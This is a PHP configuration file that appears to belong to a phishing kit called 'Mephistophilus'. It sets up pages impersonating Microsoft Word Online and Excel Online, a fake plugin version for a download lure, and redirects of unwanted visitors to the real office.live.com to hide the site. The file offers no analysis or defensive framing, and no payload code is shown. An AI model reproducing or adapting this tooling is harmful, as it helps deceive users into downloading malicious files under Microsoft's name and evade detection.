<?php 

	/* ################## General Parameters ################# */
	// ------------------------------------------------------- //
		$title = 'MEP-1B';
		$logo_text = 'Mephistophilus';	
		define('MEP_VER', '1.6');
		define('MEP_VER_MY', 'October 2017');
		define('DEBUG', 0);
		define('OVERLAY_TRANSPARENT', '0.7');
		//define('FILENAME', '_plugin_update');
		define('SHOW_CONTENT_BEFORE_DOWNLOAD', 1);		
		define('WORD_EXCEL_PLUGIN_VERSION', '28.0.2.11');			
		define('CHANGELOG_FILE', $_SERVER['DOCUMENT_ROOT'].'/changelog.lg');			
	// ------------------------------------------------------- //

	/* ################# MySQL Configuration ################# */
	// ------------------------------------------------------- //
		define('DB_HOST', 'localhost');
		define('DB_USER', '');
		define('DB_PASS', '');
		define('DB_NAME', 'oct');
	// ------------------------------------------------------- //
	
	/* ################# Redirect Parameters ################# */
	// ------------------------------------------------------- //
		define('REDIRECT_INDEX', 'https://office.live.com/');
		define('REDIRECT_WRONG_CLIENT', 'https://office.live.com/');
		define('REDIRECT_WRONG_FILENAME', 'https://office.live.com/');
		define('REDIRECT_LANGFILE_NOT_EXISTS', 'https://office.live.com/');
		define('REDIRECT_DOWNLOAD_FILE_NOT_EXISTS', 'https://office.live.com/');
		define('REDIRECT_WRONG_DOMAIN', 'https://office.live.com/');
		define('REDIRECT_NOT_AUTH', 'https://office.live.com/');
		define('REDIRECT_WRONG_BROWSER_PDF', 'about:blank');
		define('REDIRECT_LANGFILE_OR_PDF_FILE_NOT_EXISTS', 'about:blank');
	// ------------------------------------------------------- //
	
	/* ############## File Directory Parameter ############### */
	// ------------------------------------------------------- //
		$file_directory = $_SERVER['DOCUMENT_ROOT'].'/file_d/';
		$pdf_file_directory = $_SERVER['DOCUMENT_ROOT'].'/pdf_d/';
		$lang_directory = $_SERVER['DOCUMENT_ROOT'].'/languages/';
		$lang_img_directory = $_SERVER['SERVER_NAME'].'/languages/images/';
	// ------------------------------------------------------- //
		$methods = array(
			'WORD' => 'Microsoft Word Online',
			'EXCEL' => 'Microsoft Excel Online'
		);
		
		$methods_path = array(
			'WORD' => $_SERVER['SERVER_NAME'].'/view/word_m/',
			'EXCEL' => $_SERVER['SERVER_NAME'].'/view/excel_m/'
		);
	
		$pdf_m_path = $_SERVER['SERVER_NAME'].'/view/pdf_m/';
		$pdf_v2_path = $_SERVER['SERVER_NAME'].'/view/pdf_v2/';
		$pdf_v3_path = $_SERVER['SERVER_NAME'].'/view/pdf_v3/';
		
		$pdf_4js_path = $_SERVER['SERVER_NAME'].'/pdf_d/';
	// ------------------------------------------------------- //
?>